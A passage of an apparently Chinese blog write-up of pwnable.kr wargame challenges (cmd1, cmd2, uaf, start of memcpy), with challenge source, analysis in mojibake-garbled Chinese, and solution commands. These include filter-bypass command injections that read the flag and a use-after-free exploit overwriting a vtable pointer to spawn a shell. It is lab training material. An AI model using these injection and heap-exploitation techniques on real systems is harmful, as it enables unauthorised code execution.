class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê-13"><a href="#ÂàÜÊûê-13" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><ul><li>strstrÔºöËøîÂõûÂ≠óÁ¨¶‰∏≤str‰∏≠Á¨¨‰∏ÄÊ¨°Âá∫Áé∞Â≠ê‰∏≤substrÁöÑÂú∞ÂùÄÔºõÂ¶ÇÊûúÊ≤°ÊúâÊ£ÄÁ¥¢Âà∞Â≠ê‰∏≤ÔºåÂàôËøîÂõûNULL</li></ul><p>filter ‰∏≠ËøáÊª§‰∫Ü‰∏â‰∏™Â≠óÁ¨¶‰∏≤<code>flag</code>„ÄÅ<code>sh</code>„ÄÅ<code>tmp</code></p><p>‰ΩÜÊòØÔºüÔºüÔºüËøòÊòØÊ≤°ÊòéÁôΩÂíå PATH ÁöÑÂÖ≥Á≥ª</p><h3 id="Ëß£È¢ò-13"><a href="#Ëß£È¢ò-13" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><p>ÈÄöÈÖçÁ¨¶Áõ¥Êé•‰∏äÔºåË∑üÈ¢òÁõÆÊ≤°Â§™Â§ßÂÖ≥Á≥ª</p><pre class=" language-shell"><code class="language-shell">cmd1@pwnable:~$ /home/cmd1/cmd1 "/bin/cat /home/cmd1/f*"mommy now I get what PATH environment is for :)</code></pre><h2 id="15-cmd2"><a href="#15-cmd2" class="headerlink" title="15. cmd2"></a>15. cmd2</h2><h3 id="È¢òÁõÆ-14"><a href="#È¢òÁõÆ-14" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> cmd<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> r<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"="</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"PATH"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"export"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"`"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> r<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">extern</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> environ<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">delete_env</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> p<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>p<span class="token operator">=</span>environ<span class="token punctuation">;</span> <span class="token operator">*</span>p<span class="token punctuation">;</span> p<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">*</span>p<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">*</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> envp<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">delete_env</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"PATH=/no_command_execution_until_you_become_a_hacker"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê-14"><a href="#ÂàÜÊûê-14" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>ËøáÊª§Êõ¥ÂΩªÂ∫ïÔºåÊÉ≥ÂäûÊ≥ïÁªï</p><h3 id="Ëß£È¢ò-14"><a href="#Ëß£È¢ò-14" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-shell"><code class="language-shell">cmd2@pwnable:~$ cd /cmd2@pwnable:/$ /home/cmd2/cmd2 '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f???'$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f???FuN_w1th_5h3ll_v4riabl3s_haha</code></pre><h2 id="16-uaf"><a href="#16-uaf" class="headerlink" title="16. uaf"></a>16. uaf</h2><h3 id="È¢òÁõÆ-15"><a href="#È¢òÁõÆ-15" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span> </span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;cstring></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;cstdlib></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>using namespace std<span class="token punctuation">;</span>class Human<span class="token punctuation">{</span>private<span class="token punctuation">:</span>    virtual <span class="token keyword">void</span> <span class="token function">give_shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>protected<span class="token punctuation">:</span>    <span class="token keyword">int</span> age<span class="token punctuation">;</span>    string name<span class="token punctuation">;</span>public<span class="token punctuation">:</span>    virtual <span class="token keyword">void</span> <span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"My name is "</span> <span class="token operator">&lt;&lt;</span> name <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"I am "</span> <span class="token operator">&lt;&lt;</span> age <span class="token operator">&lt;&lt;</span> <span class="token string">" years old"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span>class Man<span class="token punctuation">:</span> public Human<span class="token punctuation">{</span>public<span class="token punctuation">:</span>    <span class="token function">Man</span><span class="token punctuation">(</span>string name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span><span class="token punctuation">{</span>        this<span class="token operator">-></span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        this<span class="token operator">-></span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        virtual <span class="token keyword">void</span> <span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        Human<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cout <span class="token operator">&lt;&lt;</span> <span class="token string">"I am a nice guy!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span>class Woman<span class="token punctuation">:</span> public Human<span class="token punctuation">{</span>public<span class="token punctuation">:</span>        <span class="token function">Woman</span><span class="token punctuation">(</span>string name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span><span class="token punctuation">{</span>                this<span class="token operator">-></span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>                this<span class="token operator">-></span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        virtual <span class="token keyword">void</span> <span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        Human<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cout <span class="token operator">&lt;&lt;</span> <span class="token string">"I am a cute girl!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    Human<span class="token operator">*</span> m <span class="token operator">=</span> new <span class="token function">Man</span><span class="token punctuation">(</span><span class="token string">"Jack"</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Human<span class="token operator">*</span> w <span class="token operator">=</span> new <span class="token function">Woman</span><span class="token punctuation">(</span><span class="token string">"Jill"</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    size_t len<span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> data<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> op<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"1. use\n2. after\n3. free\n"</span><span class="token punctuation">;</span>        cin <span class="token operator">>></span> op<span class="token punctuation">;</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span>op<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>                m<span class="token operator">-></span><span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                w<span class="token operator">-></span><span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>                len <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                data <span class="token operator">=</span> new <span class="token keyword">char</span><span class="token punctuation">[</span>len<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token function">read</span><span class="token punctuation">(</span><span class="token function">open</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>                cout <span class="token operator">&lt;&lt;</span> <span class="token string">"your data is allocated"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>                delete m<span class="token punctuation">;</span>                delete w<span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token punctuation">:</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê-15"><a href="#ÂàÜÊûê-15" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>Áªà‰∫éÂà∞ use-after-free ÁöÑÈ¢ò‰∫Ü</p><p>Â≠¶‰π†ÂèØ‰ª•Áúã‰∏ãËøô‰∏™ËßÜÈ¢ëÔºö<a href="https://www.youtube.com/watch?v=ZHghwsTRyzQ" target="_blank" rel="noopener">The Heap: How do use-after-free exploits work? - bin 0x16</a></p><p>È¢òÁõÆÊèê‰æõ‰∫Ü‰∏âÁßçÊìç‰ΩúÔºåÂàÜÂà´ÂØπÁî® ÈáäÊîæ-ÂàÜÈÖç-Ë∞ÉÁî®</p><ol><li>Êàë‰ª¨ÂÖàÊù•Áúã‰∏ãÂú®Â†Ü‰∏≠ÁöÑÁªìÊûÑÔºåÈ¶ñÂÖàË¶ÅÁ°ÆÂÆöÂ§ßÂ∞è‰∏∫ 24 Â≠óËäÇ</li></ol><pre class=" language-armasm"><code class="language-armasm">0x0000000000400efb <+55>:   mov    edi,0x180x0000000000400f00 <+60>:   call   0x400d90 <operator new(unsigned long)@plt></code></pre><p>Âú® heap ‰∏≠Êàë‰ª¨‰πüËÉΩÁúãÂà∞ÂàÜÈÖç‰∫ÜÈïøÂ∫¶‰∏∫0x20ÁöÑÁ©∫Èó¥Ôºå‰∏∫‰ªÄ‰πà‰∏çÊòØ0x18Âë¢ÔºåÊòØÊ∫êËá™ malloc_chunk Êó∂‰ºöËøõË°åÂØπÈΩêÔºåÂÖ∑‰ΩìÂèØËßÅËøôÁØáÊñáÁ´†<a href="https://wiki.x10sec.org/pwn/heap/heap_structure/" target="_blank" rel="noopener">Â†ÜÁõ∏ÂÖ≥Êï∞ÊçÆÁªìÊûÑ</a></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15916053178506.jpg" alt></p><p>ÈÄöËøá chunk Â§çÁî®Â≠òÂÖ•ÁöÑÁªìÊûÑ‰ΩìÂ¶Ç‰∏ãÔºåÂèØ‰ª•ÁúãÂà∞Êï∞ÊçÆÂàÜÂà´ÂØπÂ∫î</p><ul><li>8 (vptr)</li><li>8 (int_age)</li><li>8 (prt_name)</li></ul><p><strong>ËøôÈáåÊúâ‰∏™Â•áÊÄ™ÁöÑÁÇπÔºåÂèØ‰ª•ÁúãÂà∞ ptr_name ÂùáÊòØÊåáÂêë‰∏ä‰∏Ä‰∏™chunkË¢´Â§çÁî®ÈÉ®ÂàÜ‰∏≠ÁöÑÈô§ priv_size Âíå size ÁöÑÂâ©‰ΩôÈÉ®ÂàÜÔºåÂèØËÉΩÊòØÁºñËØë‰ºòÂåñÂØºËá¥ÁöÑÔºü</strong></p><p>Ê≥®ÊÑèÂà∞ÊòØÂÖàÈÄöËøá Man ÁöÑËôöË°®ÂéªË∞ÉÁî® introduce ÊñπÊ≥ï</p><pre class=" language-armasm"><code class="language-armasm">pwndbg> x/4 0x4015700x401570 <vtable for Man+16>:    0x000000000040117a    0x00000000004012d20x401580 <vtable for Human>:    0x0000000000000000    0x00000000004015f0pwndbg> x 0x40117a0x40117a <Human::give_shell()>:    0x10ec8348e5894855pwndbg> x 0x4012d20x4012d2 <Man::introduce()>:    0x10ec8348e5894855</code></pre><p>ÊâÄ‰ª•Êàë‰ª¨Âè™Ë¶ÅËÉΩË¶ÜÁõñ vptr ‰ΩøÂÖ∂ÊåáÂêë ÂéüÂú∞ÂùÄ-8ÔºåÂç≥0x401570 - 0x8 = 0x00401568ÔºåËøôÊ†∑ÁªèËøáÊâßË°åÊó∂ÁöÑ+0x8Â∞±‰ºöË∞ÉÁî® give_shell ÂáΩÊï∞</p><p>ËøôÈáåËøòË¶ÅÊ≥®ÊÑèÔºåfree Êó∂ÂÖàÈáäÊîæÁöÑ m ÂêéÈáäÊîæÁöÑ wÔºåÊâÄ‰ª•Â°´ÂÖÖÊó∂ÊòØÂÖàÂ°´ÂÖÖÁöÑ w ÂêéÂ°´ÂÖÖ mÔºåÊâÄ‰ª•ÈúÄË¶ÅÊ≠•È™§ 2 ÊâßË°å‰∏§Ê¨°</p><p>Âè¶Â§ñÔºåÁî±‰∫éÊàë‰ª¨Âè™ÈúÄË¶ÅÂ°´ÂÖÖ vptr ÈÉ®ÂàÜÔºåÊâÄÈúÄ 8 Â≠óËäÇÊòØÂ∞è‰∫éÈáäÊîæÁöÑ chunk ÁöÑÔºåÊâÄ‰ª•‰ºöÁõ¥Êé•Â°´ÂÖÖ‰∏§Ê¨°Ê∂àËÄóÈáäÊîæÁöÑÁ©∫Èó¥Âç≥ÂèØ</p><h3 id="Ëß£È¢ò-15"><a href="#Ëß£È¢ò-15" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-shell"><code class="language-shell">uaf@pwnable:~$ python -c  'print "\x68\x15\x40\x00\x00\x00\x00\x00"' > /tmp/uafpassuaf@pwnable:~$ ./uaf 8 /tmp/uafpass1. use2. after3. free31. use2. after3. free2your data is allocated1. use2. after3. free2your data is allocated1. use2. after3. free1$ cat flagyay_f1ag_aft3r_pwning</code></pre><p>ÂèÇËÄÉÔºö</p><ol><li><a href="https://tzhuobo.gitee.io/2019/11/21/pwnable-kr-uaf/" target="_blank" rel="noopener">https://tzhuobo.gitee.io/2019/11/21/pwnable-kr-uaf/</a></li><li><a href="http://weaponx.site/2017/02/15/uaf-writeup-pwnable-kr/" target="_blank" rel="noopener">http://weaponx.site/2017/02/15/uaf-writeup-pwnable-kr/</a></li></ol><h2 id="17-memcpy"><a href="#17-memcpy" class="headerlink" title="17. memcpy"></a>17. memcpy</h2><h3 id="È¢òÁõÆ-16"><a href="#È¢òÁõÆ-16" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// compiled with : gcc -o memcpy memcpy.c -m32 -lm</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span></span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token function">rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"rdtsc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">slow_memcpy</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> dest<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> src<span class="token punctuation">,</span> size_t len<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> src<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> dest<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">fast_memcpy</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> dest<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> src<span class="token punctuation">,</span> size_t len<span class="token punctuation">)</span><span class="token punctuation">{</span>    size_t i<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 64-byte block fast copy</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>len <span class="token operator">>=</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        i <span class="token operator">=</span> len <span class="token operator">/</span> <span class="token number">64</span><span class="token punctuation">;</span>        len <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">64</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">--</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            __asm__ <span class="token function">__volatile__</span> <span class="token punctuation">(</span>            <span class="token string">"movdqa (%0), %%xmm0\n"</span>            <span class="token string">"movdqa 16(%0), %%xmm1\n"</span>            <span class="token string">"movdqa 32(%0), %%xmm2\n"</span>            <span class="token string">"movdqa 48(%0), %%xmm3\n"</span>            <span class="token string">"movntps %%xmm0, (%1)\n"</span>            <span class="token string">"movntps %%xmm1, 16(%1)\n"</span>            <span class="token string">"movntps %%xmm2, 32(%1)\n"</span>            <span class="token string">"movntps %%xmm3, 48(%1)\n"</span>            <span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token string">"r"</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            dest <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>            src <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// byte-to-byte slow copy</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span> <span class="token function">slow_memcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> dest<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> _IOLBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hey, I have a boring assignment for CS class.. :(\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The assignment is simple.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- What is the best implementation of memcpy?        -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- 1. implement your own slow/fast version of memcpy -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- 2. compare them with various size of data         -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- 3. conclude your experiment and submit report     -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This time, just help me out with my experiment and get flag\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"No fancy hacking, I promise :D\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> t1<span class="token punctuation">,</span> t2<span class="token punctuation">;</span>    <span class="token keyword">int</span> e<span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> src<span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> dest<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> low<span class="token punctuation">,</span> high<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> size<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// allocate memory</span>    <span class="token keyword">char</span><span class="token operator">*</span> cache1 <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x4000</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> MAP_PRIVATE<span class="token operator">|</span>MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> cache2 <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x4000</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> MAP_PRIVATE<span class="token operator">|</span>MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    src <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x2000</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> MAP_PRIVATE<span class="token operator">|</span>MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    size_t sizes<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// setup experiment parameters</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>e<span class="token 